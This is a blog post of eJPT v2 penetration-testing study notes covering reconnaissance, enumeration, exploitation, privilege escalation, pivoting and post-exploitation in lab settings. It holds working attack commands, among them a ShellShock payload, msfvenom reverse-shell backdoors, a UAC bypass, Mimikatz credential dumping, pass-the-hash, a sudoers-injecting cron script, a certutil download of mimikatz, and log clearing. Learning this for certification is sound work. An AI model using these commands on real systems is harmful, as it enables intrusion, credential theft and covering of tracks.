---
title: "eJPTV2 Study Notes"
date: 2025-12-12
categories: [certifications]
tags: [eJPTV2, Preparation, notes, pentest]
---

# eJPT v2 - Comprehensive Preparation Guide

![eJPT Logo](/assets/Images/ejpt/Screenshot_2025-08-02_023018.png)

## Assessment Methodologies: Information Gathering

Gathering information about individuals, companies, websites, or systems is the first step in any penetration test.

### Passive Reconnaissance

![Passive Recon Diagram](/assets/Images/ejpt/Screenshot_2025-07-30_151004.png)

#### Website Reconnaissance
- **Sitemap.xml**: Map of website structure
- **robots.txt**: Instructs web crawlers which directories not to index
- **Wayback Machine**: Historical website snapshots
- **Google Dorks**: Advanced search queries to find exposed information
- **Wappalizer**: Technology stack identification
- **BuiltWith**: Website technology profiler

### Active Reconnaissance

![Active Recon Diagram](/assets/Images/ejpt/Screenshot_2025-07-30_151043.png)

### Useful Commands

```bash
whatis             # Display one-line manual page descriptions
whatweb            # Next generation web scanner for technology identification
host               # DNS lookup utility
whois              # Domain registration information
dnsrecon           # DNS enumeration and scanning tool
wafw00f            # Web Application Firewall identification and fingerprinting
sublist3r          # OSINT subdomain enumeration tool
theHarvester       # Email and subdomain gathering
dnsenum            # Multithreaded DNS enumeration script
dig                # DNS lookup utility
netdiscover        # Active/passive ARP reconnaissance tool
```

### Important Notes

**Cloudflare DNS Considerations:**
Cloudflare's proxy primarily handles web traffic (HTTP/HTTPS) and does not proxy mail server traffic by default. If experiencing email issues after using Cloudflare, it's likely due to DNS records being proxied, which can disrupt email protocols like SMTP, IMAP, and POP3. To resolve this, ensure that DNS records related to your mail server (MX and A records for mail subdomains) are set to "DNS only" or "unproxied" in Cloudflare settings.

### Lab Exercise Summary

1. **Check robots.txt**: Found hidden directories
2. **Aggressive NMAP scan**: Identified open ports and services
3. **Directory brute-force**: Searched for backup files
   ```bash
   dirb http://192.71.175.3/ -w big.txt -X .bak
   ```
4. **Found flag**: Located in `/wp-content/uploads`
5. **Website cloning**: Used httrack and grep to find flags
   ```bash
   grep -i "flag" -R .
   ```

### Topics to Research
- **DNSSEC**: Security extensions for DNS that hide domain owner information
  - [Cloudflare DNSSEC Guide](https://www.cloudflare.com/en-gb/learning/dns/dnssec/how-dnssec-works/)

---

## Assessment Methodologies: Footprinting & Scanning

TLS negotiation occurs only after TCP three-way handshake is established.

### Nmap Scanning

**Default Scan**: Scans the 1000 most commonly used ports.

**Search in Nmap Manual**: Use `/ + 'search term'` in man pages.

#### Nmap Scripting Engine (NSE)
Default scripts run with `-sC` flag. These are considered safe as they gather information without actively engaging targets.

**List HTTP Scripts:**
```bash
/usr/share/nmap/scripts | grep -e "http"
```

**Get Script Information:**
```bash
nmap --script-help=<scriptName>
```

#### Common Nmap Flags

| Flag | Description |
|------|-------------|
| `-sn` | Ping sweep/host discovery (no port scan) |
| `-Pn` | Skip host discovery (no ping) |
| `-p` | Specify ports to scan |
| `-p-` | Scan all 65,535 ports |
| `-F` | Fast scan (100 most common ports) |
| `-sU` | UDP scan |
| `-sV` | Service version detection |
| `-O` | OS detection |
| `-sC` | Default script scan |
| `-A` | Aggressive scan (OS + version + script + traceroute) |
| `-oN` | Output to normal format file |
| `-oX` | Output to XML file |
| `-iL` | Input from target list file |
| `-PS` | SYN ping scan |
| `--send-ip` | Send ICMP echo requests |
| `-sS` | SYN stealth scan |
| `-f` | Fragment packets |
| `-D` | Decoy IP addresses |
| `-g` | Source port number |
| `--data-length` | Append random data to packets |
| `--host-timeout` | Give up on target after specified time |
| `--scan-delay` | Delay between probes |

**Aggressive Scan Example:**
```bash
nmap -T4 -sS -sV --version-intensity 8 -O --osscan-guess -p- <ip>
```

### Network Mapping

#### Host Discovery Techniques
1. **Ping Sweep**: Send ICMP echo requests to network range
   ![Ping Sweep Diagram](/assets/Images/ejpt/Screenshot_2025-08-01_180347.png)

2. **ARP Scanning**: Send ARP requests within broadcast domain

3. **TCP SYN Ping**: Send SYN packets to specific ports (stealthier than ICMP)

4. **UDP Ping**: Useful when hosts don't respond to ICMP/TCP

5. **TCP ACK Ping**: Expects no response; RST indicates live host

6. **SYN-ACK Ping**: RST response indicates live host

**Combined Discovery Example:**
```bash
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 <ip>
```

#### Network Mapping Objectives
- Identify open ports and services
- Map network topology
- Perform OS fingerprinting
- Determine service versions
- Identify security measures (firewalls, IPS/IDS)

### Useful Commands

```bash
netstat -antp      # Show TCP connections
fping -a -g <CIDR> # Fast ping sweep
```

---

## Assessment Methodologies: Enumeration

Gathering detailed information about target systems, including accounts, shares, and misconfigurations.

### FTP Enumeration (Port 21)

**Objectives:**
- Get FTP version
- Check for anonymous login
- Brute-force usernames and passwords

### SMB Enumeration (Ports 139, 445)

```bash
# List shares
smbclient -L \\\\<ip>\\ -u <user>

# Interact with specific share
smbclient \\\\<ip>\\<share> -u <user%pass>
```

**Objectives:**
- Get SMB version
- Enumerate usernames
- Enumerate shares
- Check for null sessions

### Lab: Enumeration CTF 1

#### 1. Enumerate Shares Script
```bash
#!/bin/bash

# Check if arguments are provided
if [ $# -ne 2 ]; then
    echo "Usage: $0 <target_ip> <shares_file>"
    exit 1
fi

TARGET=$1
SHARES_FILE=$2

# Check if file exists
if [ ! -f "$SHARES_FILE" ]; then
    echo "Error: Shares file $SHARES_FILE not found!"
    exit 1
fi

echo "[*] Testing shares on $TARGET"

while IFS= read -r SHARE || [[ -n "$SHARE" ]]; do
    # Skip empty lines
    [ -z "$SHARE" ] && continue
    
    echo -n "Testing $SHARE... "
    
    # Run smbclient command and capture output
    OUTPUT=$(smbclient "//$TARGET/$SHARE" -N -c "ls" 2>&1)
    STATUS=$?
    
    if [ $STATUS -eq 0 ]; then
        echo -e "\n[+] Accessible share: $SHARE"
        echo "$OUTPUT" | grep -v "Domain=" | grep -v "session request failed"
        echo "----------------------------------------"
    else
        echo "Failed"
    fi
done < "$SHARES_FILE"

echo "[*] Scan completed"
```

#### 2. Access Specific Share
```bash
smbclient "//192.43.50.3/josh" -U "josh%purple" -c "get flag2.txt"
```

#### 3. FTP Login

#### 4. SSH Banner Grabbing

**Methodology Used:**
1. FTP access revealed account information
2. Brute-forced discovered accounts
3. Metasploit SMB username enumeration found 'josh'
4. Brute-forced josh's password
5. Scripted share enumeration for anonymous and authenticated access

---

## Assessment Methodologies: Vulnerability Assessment

### Metasploit Framework

**Module Types:**
- **Auxiliary**: Scanning and reconnaissance
- **Exploit**: Actual exploit modules

**Useful Commands:**
```bash
db_import     # Import scan results
db_nmap       # Run nmap within Metasploit
analyze       # Analyze database and suggest exploits
vulns         # Show discovered vulnerabilities
db_autopwn    # External plugin for automated exploitation (in /usr/share/metasploit-framework/plug-ins)
hosts         # Show discovered hosts
services      # Show discovered services
```

### WebDAV Assessment

**Default Directory:** `/webdav/`

**Tools:**
- **davtest**: Scan and authenticate to WebDAV
- **cadaver**: Upload files to WebDAV

**Brute Force Example:**
```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.6.30.105 http-get /webdav/
```

### Notable Vulnerabilities
- **EternalBlue** (MS17-010)
- **BlueKeep** (CVE-2019-0708)
- **ShellShock** (CVE-2014-6271)

**ShellShock Example:**
```bash
nmap -p80 --script=http-shellshock --script-args uri=/gettime.cgi 192.253.253.3
```

**Apache ShellShock Payload:**
```
User-Agent: () { :;}; echo "NS:" $(</etc/passwd)
```

---

## Host & Network Penetration Testing: System/Host Based Attacks

### WebDAV Exploitation

WebDAV (Web Distributed Authoring and Versioning) allows file upload/download from web servers.

**Exploitation Steps:**
1. **Nmap scan** to identify WebDAV (usually port 80)
   ```bash
   nmap --script=http-enum <target>
   ```
2. **Brute force authentication**
3. **Test file execution with davtest**
   ```bash
   davtest -url <url>
   ```
4. **Upload web shell with cadaver**
   ```bash
   cadaver <url>
   ```

### RDP (Remote Desktop Protocol)

**Identification:**
- Metasploit `rdp_scan` module
- Nmap scan port 3389

**Brute Force:**
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.6.24.44 -s3333
```

**Access:**
```bash
xfreerdp /v:<target_ip_or_hostname:port> /u:<username> /p:<password>
```

### BlueKeep (CVE-2019-0708)
RDP vulnerability affecting Windows 7 and Server 2008.

### WinRM (Windows Remote Management)

**Ports:** 5985 (HTTP), 5986 (HTTPS)
**Not enabled by default**

**Tools:**
- `evil-winrm` (Ruby script)
- `crackmapexec`

**Examples:**
```bash
evil-winrm.rb -u <administrator> -p "<password>" -i "<ip>"
crackmapexec winrm <ip> -u <username> -p <wordlist path> -x <command>
```

**Lab Steps:**
1. Nmap scan revealed port 5985 open
2. Cracked password with crackmapexec
3. Used Metasploit module: `exploit/windows/winrm/winrm_script_exec`
4. Set `FORCE_VBS True`

### Windows Privilege Escalation

#### Kernel Exploits
**Metasploit Commands:**
```bash
getuid    # Get current user ID
getprivs  # Get current privileges
```

**Tools:**
- **Windows Exploit Suggester**: [GitHub Repo](https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git)
- **Windows Kernel Exploits**: [GitHub Repo](https://github.com/SecWiki/windows-kernel-exploits.git)
- **Metasploit Module**: `local_exploit_suggester`

#### UAC Bypass
![UAC Diagram](/assets/Images/ejpt/image.png)

**Tool:** [UACME](https://github.com/hfiref0x/UACME.git)

**Lab Steps (Bypass UAC):**
1. Nmap scan revealed HFS (HTTP File Server)
2. Exploited HFS, gained Meterpreter session
3. Ran `getprivs` command
4. Created backdoor:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.45.10 LPORT=1234 -f exe > backdoor.exe
   ```
5. Set up handler with `multi/handler`
6. Uploaded `akagi.exe` and `backdoor.exe` to victim
7. Executed: `.\Akagi64.exe 23 C://Temp/backdoor.exe`
8. Dumped hashes with `hashdump`

#### Access Token Impersonation
![Token Impersonation 1](/assets/Images/ejpt/image%201.png)
![Token Impersonation 2](/assets/Images/ejpt/image%202.png)

**Steps:**
1. Migrate to explorer process: `pgrep explorer`
2. Load incognito module
3. List tokens: `list_tokens -u`
4. Impersonate token: `impersonate_token "<token>"`

**Research Topic:** Potato Attack

#### Windows File System Vulnerabilities
**Alternate Data Streams (ADS)**
![ADS Diagram](/assets/Images/ejpt/image%203.png)

#### Windows Credential Dumping
**Searching Config Files:**
![Config Search](/assets/Images/ejpt/image%204.png)

**Mimikatz Dumping:**
![Mimikatz](/assets/Images/ejpt/image%205.png)

**Metasploit (Kiwi Module):**
```bash
load kiwi           # Load Mimikatz extension
?                   # Show available commands
privilege::debug    # Enable debug privileges (look for '20 OK')
lsadump::sam        # Dump SAM hashes
lsadump::secrets    # Display cleartext passwords if available
sekurlsa::logonpasswords  # Display logon passwords from memory
```

**PowerSploit:** [GitHub Repo](https://github.com/PowerShellMafia/PowerSploit)

#### Pass The Hash
![PTH Diagram](/assets/Images/ejpt/image%206.png)

**CrackMapExec:**
```bash
crackmapexec smb <ip> -u <user> -H "NT Hash" -x "command"
```

**Metasploit:**
```bash
use windows/smb/psexec
set target Native\ upload
set SmbPass <LMHash:NTHHash>
```

### Linux Privilege Escalation

#### Kernel Exploits
**Methodology:**
1. Identify kernel vulnerabilities
2. Download and compile exploits
3. Transfer to target

**Tool:** [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester.git)

#### Cronjobs
```bash
crontab -l  # Display cron jobs
grep -rnw /usr -e "/home/student/message"  # Search for cron script usage
```

**Exploit Example:**
```bash
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

#### SUID Binaries
Identify and exploit SUID binaries with misconfigured permissions.

---

## Network Attacks

### SNMP Enumeration
![SNMP Diagram](/assets/Images/ejpt/image%207.png)

### Pivoting Techniques

#### Autoroute (Metasploit)
```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 169.254.0.0
run
```

#### Manual Route Addition
```bash
route add <IP ADDRESS OF SUBNET> <NETMASK> <GATEWAY>
route add 169.254.0.0 255.255.0.0 1
route get 169.254.204.110  # Verify route
```

#### SOCKS Proxy for Third-Party Tools
**Metasploit SOCKS Module:**
```bash
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
jobs  # Verify running
```

**Proxychains-ng Setup:**
```bash
git clone https://github.com/rofl0r/proxychains-ng
cd proxychains-ng
make
sudo make install
```

**Edit Configuration:**
```bash
sudo nano /etc/proxychains.conf
# Add: socks5 127.0.0.1 1080
```

**Usage:**
```bash
proxychains nmap -sT -Pn <target>
```

**Note:** ICMP and UDP traffic cannot tunnel through SOCKS proxy.

#### Network Discovery Commands
```bash
net view  # Windows network discovery
```

---

## Metasploit Framework

### File System Structure
- **Default modules**: `/usr/share/metasploit-framework/modules`
- **User modules**: `~/.msf4/modules`

### Payload Types

#### Non-Staged Payload
Entire payload sent with exploit (larger, less reliable)

#### Staged Payload
- **Stager**: Establishes connection, downloads stage
- **Stage**: Actual payload components (reverse shell, etc.)
- More reliable for unstable connections

### Meterpreter
Advanced in-memory payload providing interactive command line interface.

### Searching Modules
```bash
search <term> type:<module_type> platform:<os>
```

### Msfvenom Payload Creation
**Windows Example:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -i 10 -e x64/shikata_ga_nai -f exe > payload.exe
```

**Linux Example:**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -i 10 -e x86/shikata_ga_nai -f elf > payload
```

**Embedded Payload:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Port> -i 10 -e x64/shikata_ga_nai -f exe -k -x winrar.exe
```

### RSYNC Enumeration
```bash
rsync <ip>::              # Banner grabbing & list shares
rsync -av --list-only rsync://<ip>/<share>  # List share contents
rsync -av rsync://<ip>/<share> .           # Download entire share
```

### Windows Post-Exploitation

#### Local Enumeration Modules
```bash
post/windows/gather/win_privs              # User privileges
post/windows/gather/enum_logged_on_users   # Logged-in users
post/windows/gather/checkvm                # Virtual machine check
post/windows/gather/enum_applications      # Installed programs
post/windows/gather/enum_av_excluded       # AV exclusions
post/windows/gather/enum_computers         # Domain computers
post/windows/gather/enum_patches           # Installed patches
windows/manage/enable_rdp                  # Enable RDP
```

#### Enumeration Objectives
- User privileges
- Logged-in users
- VM detection
- Installed programs
- AV presence
- Domain computers
- Installed patches
- Network shares

#### Privilege Escalation
```bash
windows/local/bypassuac_injection  # UAC bypass module
```

#### Persistence
```bash
windows/local/persistence_service  # Requires multi-handler
```

#### Clearing Tracks
```bash
clearev  # Meterpreter command to clear event logs
```

### Linux Post-Exploitation

#### Enumeration Modules
```bash
post/linux/gather/enum_configs      # System configuration
post/multi/gather/env               # Environment variables
post/linux/gather/enum_network      # Network configuration
post/linux/gather/enum_protections  # Security protections
post/linux/gather/enum_system       # System information
post/linux/gather/checkcontainer    # Container detection
post/linux/gather/checkvm           # VM detection
post/linux/gather/enum_users_history # User command history
post/multi/manage/system_session    # System session management
post/linux/manage/download_exec     # Download and execute
```

**Note:** `notes` command in Meterpreter stores loot (similar to Windows).

#### Manual Persistence Techniques
1. Create disguised service account:
   ```bash
   useradd -m <service-like-name>
   ```
2. Modify groups to appear legitimate
3. Add SSH keys to user accounts

---

## Exploitation Techniques

### Vulnerability Scanning

#### Banner Grabbing
```bash
nmap --script=banner <target>
nc <ip> <port>
```

#### Searchsploit
```bash
searchsploit remote windows smb
```

### Exploit Compilation
Reference: [ExploitDB Binary Exploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)

### Bind & Reverse Shells

#### Netcat Functions
- **File Transfer**:
  ```bash
  nc -nv <ip> <port> < file
  ```
- **Command Execution**:
  ```bash
  nc -nvlp <port> -e cmd.exe
  ```
- **Banner Grabbing**
- **Port Scanning**
- **Bind/Reverse Shells**

---

## Post-Exploitation

### Enumeration

#### Windows Enumeration

**Local System:**
```batch
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**Services and Processes:**
```batch
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
```

**Users & Groups:**
```batch
net user administrator
net localgroup
net localgroup administrators
```

**Network:**
```batch
route print
arp -a
netstat -ano
```

**Automation Tools:**
- **WinPEAS**
- **JAWS**: [GitHub Repo](https://github.com/411Hall/JAWS.git)

#### Linux Enumeration

**System:**
```bash
hostname
cat /etc/issue
cat /etc/*release
uname -a
df -h
cat /etc/shells
```

**Users & Groups:**
```bash
groups root
cat /etc/passwd
groups
who
lastlog
```

**Network:**
```bash
netstat
route
cat /etc/networks
cat /etc/hosts
cat /etc/resolv.conf
```

**Processes & Cron:**
```bash
ps
ls -al /etc/cron*
```

### File Transfer Methods

```bash
# Python HTTP servers
python -m SimpleHTTPServer 8000
python3 -m http.server 8000

# Windows certutil
certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
```

### Shell Stabilization

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Privilege Escalation

#### Windows Tools
- **PrivescCheck**: [GitHub Repo](https://github.com/itm4n/PrivescCheck)
  ```powershell
  powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
  ```
- **Runas Command**:
  ```batch
  runas.exe /user:administrator cmd
  ```

---

## TryHackMe Practice Labs

### Recommended Rooms:
1. [Blaster](https://tryhackme.com/room/blaster)
2. [Blog](https://tryhackme.com/room/blog)
3. [Blue](https://tryhackme.com/room/blue)
4. [Bolt](https://tryhackme.com/room/bolt)
5. [Chill Hack](https://tryhackme.com/room/chillhack)
6. [Ice](https://tryhackme.com/room/ice)
7. [Ignite](https://tryhackme.com/room/ignite)
8. [Retro](https://tryhackme.com/room/retro)
9. [Startup](https://tryhackme.com/room/startup)
10. [RootMe](https://tryhackme.com/room/rrootme)
11. [Erit Securus I](https://tryhackme.com/room/eritsecurusi)
12. Pilgrimage
13. Knife
14. Blue

---

## Essential Tools Reference

### Core Tools:
- **Nmap** - Network scanning
- **Metasploit** - Exploitation framework
- **Hydra** - Brute force tool
- **enum4linux** - SMB enumeration
- **smbclient** - SMB interaction
- **smbmap** - SMB share enumeration
- **crackmapexec** - Windows post-exploitation
- **cadaver** - WebDAV client
- **davtest** - WebDAV testing
- **certutil** - Windows file transfer

### Key Commands Quick Reference:
```bash
# Service version scan
nmap -sV -p- <target>

# Directory brute force
dirb http://target/ -w wordlist.txt

# SMB share enumeration
smbclient -L //target/ -U user

# WebDAV testing
davtest -url http://target/webdav/

# File transfer with Python
python3 -m http.server 8000
```

---

**Good luck with your eJPT v2 certification journey!**

